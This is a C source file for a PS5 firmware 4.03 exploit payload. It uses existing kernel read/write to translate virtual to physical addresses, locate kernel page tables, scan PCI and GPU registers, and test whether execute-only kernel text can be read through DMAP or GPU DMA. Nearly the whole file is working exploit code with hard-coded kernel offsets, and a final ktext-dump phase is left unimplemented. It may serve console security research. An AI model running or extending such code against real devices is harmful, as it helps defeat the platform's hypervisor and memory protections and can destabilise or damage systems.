/*
 * gpu_dma — GPU DMA probe and exploit payload for PS5 FW 4.03
 *
 * Phase 0: Probe GNM API accessibility (can we load libSceGnmDriver?)
 * Phase 1: GPU DMA self-test (copy between userspace physical addresses)
 * Phase 2: IOMMU boundary probe (attempt GPU reads of kdata/ktext physical pages)
 * Phase 3: Ktext read/write (if Phase 2 succeeds)
 *
 * PS5 Payload SDK userspace ELF. Requires kernel R/W via etaHEN.
 *
 * Usage: Deploy via PS5_DEPLOY.
 *   ./gpu_dma <phase> [ktext_base_hex] [kdata_base_hex]
 *
 * Output goes to stdout (captured by etaHEN log or TCP).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <ps5/kernel.h>

/* PS5 system calls — not in the SDK headers but available at runtime */
int sceKernelLoadStartModule(const char *name, size_t argc, const void *argv,
                             uint32_t flags, void *opt, int *res);
int sceKernelDlsym(int handle, const char *symbol, void **addr);

/* ===================================================================
 * Virtual-to-physical address translation
 * Adapted from usermode_phys_mem/include/dmem.h
 * =================================================================== */

struct flat_pmap {
    uint64_t mtx_name_ptr;
    uint64_t mtx_flags;
    uint64_t mtx_data;
    uint64_t mtx_lock;
    uint64_t pm_pml4;
    uint64_t pm_cr3;
} __attribute__((__packed__));

struct page_level {
    int from, to;
    size_t size;
    int sign_ext, leaf;
};

static const struct page_level LEVELS[] = {
    {.from = 39, .to = 47, .size = 1ULL << 39, .sign_ext = 1, .leaf = 0},
    {.from = 30, .to = 38, .size = 1ULL << 30, .sign_ext = 0, .leaf = 0},
    {.from = 21, .to = 29, .size = 1ULL << 21, .sign_ext = 0, .leaf = 0},
    {.from = 12, .to = 20, .size = 1ULL << 12, .sign_ext = 0, .leaf = 1},
};

#define PDE_ADDR_MASK   0xffffffffff800ULL
#define PDE_PS_BIT      (1ULL << 7)
#define PDE_PRESENT_BIT (1ULL)

static uint64_t g_dmap_base;
#define PADDR_TO_DMAP(paddr) ((paddr) + g_dmap_base)

static int64_t vaddr_to_paddr(uint64_t vaddr, uint64_t cr3) {
    int64_t paddr = (int64_t)cr3;
    uint64_t pd[512];

    for (int i = 0; i < 4; i++) {
        const struct page_level *lv = &LEVELS[i];
        if (paddr < 0)
            return -1;
        kernel_copyout(PADDR_TO_DMAP(paddr), &pd, sizeof(pd));
        uint64_t idx = (vaddr >> lv->from) & ((1ULL << (lv->to - lv->from + 1)) - 1);
        uint64_t pde = pd[idx];
        if (!(pde & PDE_PRESENT_BIT))
            return -2;
        paddr = pde & PDE_ADDR_MASK;
        if (lv->leaf || (pde & PDE_PS_BIT))
            return paddr | (vaddr & (lv->size - 1));
    }
    return -3;
}

/* ===================================================================
 * Kernel info discovery
 * =================================================================== */

/* FW 4.03 offsets (from progress_session9.md) */
#define PCPU0_OFF        0x64d2280   /* pcpu[0] = kdata_base + this */
#define APIC_OPS_OFF     0x1656b0    /* apic_ops = kdata_base + this */
#define KDATA_KTEXT_GAP  0xC00000    /* kdata_base - ktext_base (typical) */

/* proc struct offsets for FW 4.03 */
#define PROC_P_VMSPACE   0x200

/*
 * Find the pmap (PML4/CR3) for a given process.
 * Scans vmspace for the characteristic pml4/cr3 pattern.
 */
static int find_proc_pmap(intptr_t proc_kaddr, struct flat_pmap *out) {
    uint64_t vmspace = 0;
    kernel_copyout(proc_kaddr + PROC_P_VMSPACE, &vmspace, 8);
    if (!vmspace)
        return -1;

    /*
     * Scan vmspace for the pmap. The flat_pmap struct has pm_pml4 and pm_cr3
     * where the low 32 bits of pm_pml4 equal pm_cr3 (since DMAP offset is
     * always page-aligned with high bits).
     */
    struct flat_pmap pm;
    for (uint64_t off = 0x100; off < 0x400; off += 8) {
        kernel_copyout(vmspace + off, &pm, sizeof(pm));
        if (pm.pm_pml4 != 0 && pm.pm_cr3 != 0 &&
            (pm.pm_pml4 & 0xFFFFFFFF) == (uint32_t)pm.pm_cr3) {
            *out = pm;
            return 0;
        }
    }
    return -2;
}

/*
 * Discover DMAP base and process CR3.
 */
static int discover_dmap(uint64_t *dmap_base, uint64_t *cr3) {
    pid_t pid = getpid();
    intptr_t proc_kaddr = kernel_get_proc(pid);
    if (!proc_kaddr) {
        printf("[-] kernel_get_proc(%d) returned NULL\n", pid);
        return -1;
    }
    printf("[+] proc kaddr: %#lx\n", (uint64_t)proc_kaddr);

    struct flat_pmap pm;
    if (find_proc_pmap(proc_kaddr, &pm) < 0) {
        printf("[-] Could not find pmap in proc's vmspace\n");
        return -2;
    }

    *dmap_base = pm.pm_pml4 - pm.pm_cr3;
    *cr3 = pm.pm_cr3;
    printf("[+] PML4=%#lx CR3=%#lx DMAP=%#lx\n", pm.pm_pml4, pm.pm_cr3, *dmap_base);
    return 0;
}

/* ===================================================================
 * Phase 0: GNM API Probe
 * =================================================================== */

static void phase0_gnm_probe(void) {
    printf("\n=== Phase 0: GNM API Accessibility Probe ===\n\n");

    const char *libs[] = {
        "libSceGnmDriver.sprx",
        "/system/common/lib/libSceGnmDriver.sprx",
        "libSceGnmDriverForNeoMode.sprx",
        "/system/common/lib/libSceGnmDriverForNeoMode.sprx",
        "libSceGnm.sprx",
        "/system/common/lib/libSceGnm.sprx",
        "libSceGraphicsDriver.sprx",
        "/system/common/lib/libSceGraphicsDriver.sprx",
    };

    for (int i = 0; i < (int)(sizeof(libs)/sizeof(libs[0])); i++) {
        printf("[*] Loading: %s ... ", libs[i]);
        int handle = sceKernelLoadStartModule(libs[i], 0, NULL, 0, NULL, NULL);
        if (handle < 0) {
            printf("FAIL (%#x)\n", handle);
            continue;
        }
        printf("OK (handle=%d)\n", handle);

        /* Resolve key GNM functions */
        const char *syms[] = {
            "sceGnmSubmitCommandBuffers",
            "sceGnmSubmitDone",
            "sceGnmSubmitAndFlipCommandBuffers",
            "sceGnmMapComputeQueue",
            "sceGnmUnmapComputeQueue",
            "sceGnmDingDong",
            "sceGnmInsertWaitFlipDone",
            "sceGnmIsUserPaEnabled",
        };
        for (int j = 0; j < (int)(sizeof(syms)/sizeof(syms[0])); j++) {
            void *addr = NULL;
            int ret = sceKernelDlsym(handle, syms[j], &addr);
            if (ret == 0 && addr)
                printf("  [+] %s = %p\n", syms[j], addr);
        }
        printf("\n");
    }

    /* Also probe graphics-adjacent libraries */
    printf("[*] Probing graphics support libraries...\n");
    const char *gfx_libs[] = {
        "libSceVideoOut.sprx",
        "/system/common/lib/libSceVideoOut.sprx",
        "libSceGpuAddress.sprx",
        "/system/common/lib/libSceGpuAddress.sprx",
        "libSceComputeParser.sprx",
        "/system/common/lib/libSceComputeParser.sprx",
    };
    for (int i = 0; i < (int)(sizeof(gfx_libs)/sizeof(gfx_libs[0])); i++) {
        int handle = sceKernelLoadStartModule(gfx_libs[i], 0, NULL, 0, NULL, NULL);
        printf("  %s: %s (%d)\n", gfx_libs[i],
               handle >= 0 ? "OK" : "FAIL", handle);
    }

    printf("\n=== Phase 0 Complete ===\n");
    printf("If GNM found -> proceed to Phase 1 with GNM backend\n");
    printf("If not -> need direct SDMA MMIO approach (Phase 0b, run with phase=5)\n");
}

/* ===================================================================
 * Phase 0b: Direct GPU MMIO / PCI Probe
 * =================================================================== */

static void phase0b_pci_probe(void) {
    printf("\n=== Phase 0b: GPU PCI / MMIO Probe ===\n\n");

    /*
     * With kernel R/W we can read PCI ECAM (Enhanced Configuration Access
     * Mechanism) space. On x86 systems, ECAM is memory-mapped at a physical
     * address specified in the MCFG ACPI table.
     *
     * Common ECAM bases: 0xE0000000, 0xF0000000, or 0xC0000000.
     * Each bus/dev/fn gets a 4KB config space block.
     *
     * PCI address formula:
     *   ECAM_BASE + (bus << 20) | (dev << 15) | (fn << 12) + reg_offset
     *
     * The GPU is typically at bus 0 or 1, device 0, function 0.
     */

    /* Try common ECAM bases */
    uint64_t ecam_candidates[] = { 0xE0000000ULL, 0xF0000000ULL, 0xC0000000ULL };

    for (int e = 0; e < 3; e++) {
        uint64_t ecam = ecam_candidates[e];
        printf("[*] Trying ECAM base %#lx...\n", ecam);

        /* Scan first 32 devices on bus 0 and bus 1 */
        for (int bus = 0; bus < 2; bus++) {
            for (int dev = 0; dev < 32; dev++) {
                uint64_t cfg_addr = ecam + ((uint64_t)bus << 20) +
                                    ((uint64_t)dev << 15);
                uint32_t vendor_dev = 0;
                kernel_copyout(PADDR_TO_DMAP(cfg_addr), &vendor_dev, 4);

                uint16_t vendor = vendor_dev & 0xFFFF;
                uint16_t device = vendor_dev >> 16;

                if (vendor == 0xFFFF || vendor == 0x0000)
                    continue;

                printf("  [%d:%d.0] vendor=%#06x device=%#06x",
                       bus, dev, vendor, device);

                if (vendor == 0x1002) {
                    printf(" <-- AMD GPU!");

                    /* Read BAR0 (offset 0x10 in config space) */
                    uint32_t bar0_lo = 0, bar0_hi = 0;
                    kernel_copyout(PADDR_TO_DMAP(cfg_addr + 0x10), &bar0_lo, 4);
                    kernel_copyout(PADDR_TO_DMAP(cfg_addr + 0x14), &bar0_hi, 4);

                    uint64_t bar0 = ((uint64_t)bar0_hi << 32) | (bar0_lo & ~0xFULL);
                    printf("\n       BAR0 = %#lx", bar0);

                    /* Read BAR2 */
                    uint32_t bar2_lo = 0, bar2_hi = 0;
                    kernel_copyout(PADDR_TO_DMAP(cfg_addr + 0x18), &bar2_lo, 4);
                    kernel_copyout(PADDR_TO_DMAP(cfg_addr + 0x1C), &bar2_hi, 4);
                    uint64_t bar2 = ((uint64_t)bar2_hi << 32) | (bar2_lo & ~0xFULL);
                    printf("  BAR2 = %#lx", bar2);

                    /* Try reading first DWORD of BAR0 as a GPU register test */
                    if (bar0) {
                        uint32_t reg0 = 0;
                        kernel_copyout(PADDR_TO_DMAP(bar0), &reg0, 4);
                        printf("\n       BAR0[0] = %#x", reg0);

                        /* Read a few SDMA-related registers */
                        /* SDMA0_STATUS is at BAR0 + (SDMA0_BASE + 0x08) * 4 */
                        uint32_t sdma_status = 0;
                        uint64_t sdma_reg = bar0 + ((0x4980 + 0x08) * 4);
                        kernel_copyout(PADDR_TO_DMAP(sdma_reg), &sdma_status, 4);
                        printf("\n       SDMA0_STATUS = %#x (at %#lx)", sdma_status, sdma_reg);
                    }
                }
                printf("\n");
            }
        }
    }

    printf("\n=== Phase 0b Complete ===\n");
}

/* ===================================================================
 * Phase 1: Physical Address Translation Self-Test
 * =================================================================== */

static void phase1_selftest(uint64_t cr3) {
    printf("\n=== Phase 1: Physical Address Translation Self-Test ===\n\n");

    size_t buf_size = 4096;
    volatile uint32_t *src = (volatile uint32_t *)mmap(NULL, buf_size,
        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    volatile uint32_t *dst = (volatile uint32_t *)mmap(NULL, buf_size,
        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (src == MAP_FAILED || dst == MAP_FAILED) {
        printf("[-] mmap failed\n");
        return;
    }

    /* Fill source with pattern, touch dst to fault in pages */
    for (int i = 0; i < (int)(buf_size / 4); i++) {
        src[i] = 0xDEADBEEF;
        dst[i] = 0;
    }

    int64_t src_phys = vaddr_to_paddr((uint64_t)src, cr3);
    int64_t dst_phys = vaddr_to_paddr((uint64_t)dst, cr3);
    printf("[+] src: VA=%p PA=%#lx\n", (void *)src, src_phys);
    printf("[+] dst: VA=%p PA=%#lx\n", (void *)dst, dst_phys);

    if (src_phys < 0 || dst_phys < 0) {
        printf("[-] VA->PA translation failed\n");
        goto out;
    }

    /* Verify translation: read src via DMAP, should match 0xDEADBEEF */
    uint32_t check = 0;
    kernel_copyout(PADDR_TO_DMAP(src_phys), &check, 4);
    printf("[*] DMAP read of src_phys: %#x %s\n", check,
           check == 0xDEADBEEF ? "(OK)" : "(MISMATCH!)");

    /* Write to dst via DMAP, verify from userspace */
    uint32_t marker = 0xCAFEBABE;
    kernel_copyin(&marker, PADDR_TO_DMAP(dst_phys), 4);
    printf("[*] Wrote %#x to dst_phys via DMAP\n", marker);
    printf("[*] Read from dst VA: %#x %s\n", dst[0],
           dst[0] == 0xCAFEBABE ? "(OK)" : "(MISMATCH!)");

    if (check == 0xDEADBEEF && dst[0] == 0xCAFEBABE) {
        printf("\n[+] Physical address translation WORKS.\n");
        printf("[+] Ready for GPU DMA: need GNM or SDMA backend.\n");
    }

out:
    munmap((void *)src, buf_size);
    munmap((void *)dst, buf_size);
    printf("\n=== Phase 1 Complete ===\n");
}

/* ===================================================================
 * Phase 2: IOMMU Boundary Probe
 * =================================================================== */

static void phase2_iommu_probe(uint64_t cr3,
                                uint64_t ktext_base, uint64_t kdata_base) {
    printf("\n=== Phase 2: IOMMU Boundary Probe ===\n\n");

    if (!ktext_base || !kdata_base) {
        printf("[-] Need ktext_base and kdata_base.\n");
        printf("    Usage: ./gpu_dma 2 <ktext_base_hex> <kdata_base_hex>\n");
        return;
    }

    printf("[+] ktext_base = %#lx\n", ktext_base);
    printf("[+] kdata_base = %#lx\n", kdata_base);

    /* Use kernel CR3 for kernel VA translation.
     * The process CR3 won't map kernel addresses correctly.
     * We need the kernel's own CR3, which we can find via kernel_pmap_store.
     *
     * kernel_pmap_store is at kdata_base + some offset.
     * Let's scan for it like dmap_tests does.
     */
    uint64_t kernel_cr3 = 0;
    printf("\n[*] Scanning kdata for kernel_pmap_store...\n");
    struct flat_pmap kpm;
    for (uint64_t off = 0; off < 0x4000000; off += 8) {
        if ((off % 0x100000) == 0 && off > 0) {
            /* Read in chunks for efficiency */
        }
        kernel_copyout(kdata_base + off, &kpm, sizeof(kpm));
        if (kpm.mtx_flags == 0x1430000 && kpm.mtx_data == 0 &&
            kpm.mtx_lock == 0x4 && kpm.pm_pml4 != 0 &&
            (kpm.pm_pml4 & 0xFFFFFFFF) == (uint32_t)kpm.pm_cr3) {
            kernel_cr3 = kpm.pm_cr3;
            printf("[+] kernel_pmap_store found at kdata+%#lx\n", off);
            printf("[+] kernel PML4=%#lx CR3=%#lx\n", kpm.pm_pml4, kpm.pm_cr3);
            /* Don't break — last match is best (same as dmap_tests) */
        }
    }

    if (!kernel_cr3) {
        printf("[-] Could not find kernel_pmap_store. Using process CR3.\n");
        printf("    (Kernel VA translations may fail)\n");
        kernel_cr3 = cr3;
    }

    /* Translate ktext and kdata to physical addresses */
    int64_t ktext_phys = vaddr_to_paddr(ktext_base, kernel_cr3);
    int64_t kdata_phys = vaddr_to_paddr(kdata_base, kernel_cr3);

    printf("\n[+] ktext VA %#lx -> PA %#lx\n", ktext_base, ktext_phys);
    printf("[+] kdata VA %#lx -> PA %#lx\n", kdata_base, kdata_phys);

    if (ktext_phys < 0) {
        printf("[-] ktext VA->PA FAILED (error %ld)\n", ktext_phys);
        printf("    ktext pages may not be in guest page tables.\n");
        printf("    This is interesting — HV may use separate page tables for ktext.\n");
    }

    if (kdata_phys < 0) {
        printf("[-] kdata VA->PA FAILED (error %ld)\n", kdata_phys);
    }

    /* Verify kdata via DMAP */
    if (kdata_phys >= 0) {
        uint64_t direct = 0, via_dmap = 0;
        kernel_copyout(kdata_base, &direct, 8);
        kernel_copyout(PADDR_TO_DMAP(kdata_phys), &via_dmap, 8);
        printf("[*] kdata verify: direct=%#lx DMAP=%#lx %s\n",
               direct, via_dmap,
               direct == via_dmap ? "MATCH" : "MISMATCH");
    }

    /* CPU DMAP read of ktext physical — tests whether XOM blocks DMAP reads */
    if (ktext_phys >= 0) {
        printf("\n[*] CPU DMAP read of ktext physical (XOM test)...\n");
        uint64_t ktext_read = 0;
        kernel_copyout(PADDR_TO_DMAP(ktext_phys), &ktext_read, 8);
        printf("    Result: %#lx\n", ktext_read);
        if (ktext_read != 0) {
            printf("    [!] NON-ZERO — XOM may not block DMAP reads!\n");
            printf("    [!] This could mean GPU DMA is unnecessary for ktext reads.\n");
            printf("    [!] Try reading a few more offsets to confirm:\n");

            /* Read several ktext offsets */
            for (uint64_t off = 0; off < 0x40; off += 8) {
                uint64_t val = 0;
                kernel_copyout(PADDR_TO_DMAP(ktext_phys + off), &val, 8);
                printf("        ktext+%#lx: %#018lx\n", off, val);
            }
        } else {
            printf("    [*] Got zeros — XOM blocks DMAP reads as expected.\n");
            printf("    [*] GPU DMA through IOMMU may bypass this.\n");
        }
    }

    /* Physical address map for GPU probing */
    printf("\n[*] Physical address map:\n");
    struct { const char *name; uint64_t va; } targets[] = {
        {"ktext+0x000000", ktext_base},
        {"ktext+0x100000", ktext_base + 0x100000},
        {"ktext+0x200000", ktext_base + 0x200000},
        {"kdata+0x000000", kdata_base},
        {"kdata+0x100000", kdata_base + 0x100000},
        {"apic_ops",       kdata_base + APIC_OPS_OFF},
    };
    for (int i = 0; i < (int)(sizeof(targets)/sizeof(targets[0])); i++) {
        int64_t pa = vaddr_to_paddr(targets[i].va, kernel_cr3);
        printf("  %-20s VA=%#lx PA=%#lx %s\n",
               targets[i].name, targets[i].va, pa,
               pa >= 0 ? "" : "FAILED");
    }

    printf("\n[*] Next: submit GPU DMA reads targeting these physical addresses.\n");
    printf("    If GPU reads ktext physical pages, XOM is BYPASSED.\n");

    printf("\n=== Phase 2 Complete ===\n");
}

/* ===================================================================
 * Main
 * =================================================================== */

int main(int argc, char *argv[]) {
    printf("=== GPU DMA Probe (PS5 FW 4.03) ===\n\n");

    int phase = 0;
    uint64_t ktext_base = 0, kdata_base = 0;

    if (argc > 1) phase = atoi(argv[1]);
    if (argc > 2) ktext_base = strtoull(argv[2], NULL, 16);
    if (argc > 3) kdata_base = strtoull(argv[3], NULL, 16);

    printf("[*] Phase: %d  PID: %d\n", phase, getpid());

    /* Discover DMAP base */
    uint64_t cr3 = 0;
    if (discover_dmap(&g_dmap_base, &cr3) < 0) {
        printf("[-] Cannot discover DMAP base. Aborting.\n");
        return 1;
    }

    switch (phase) {
        case 0: phase0_gnm_probe(); break;
        case 1: phase1_selftest(cr3); break;
        case 2: phase2_iommu_probe(cr3, ktext_base, kdata_base); break;
        case 3:
            printf("[*] Phase 3 (ktext dump via GPU DMA) — not yet implemented.\n");
            printf("    Requires GNM/SDMA backend + Phase 2 confirmation.\n");
            break;
        case 5: phase0b_pci_probe(); break;
        default:
            printf("Usage: %s <phase> [ktext_base_hex] [kdata_base_hex]\n", argv[0]);
            printf("  0: GNM API probe\n");
            printf("  1: PA translation self-test\n");
            printf("  2: IOMMU boundary probe (needs ktext/kdata bases)\n");
            printf("  3: Ktext dump via GPU (needs Phase 0+2 success)\n");
            printf("  5: PCI/MMIO GPU probe (fallback if GNM unavailable)\n");
            break;
    }

    printf("\n=== Done ===\n");
    return 0;
}
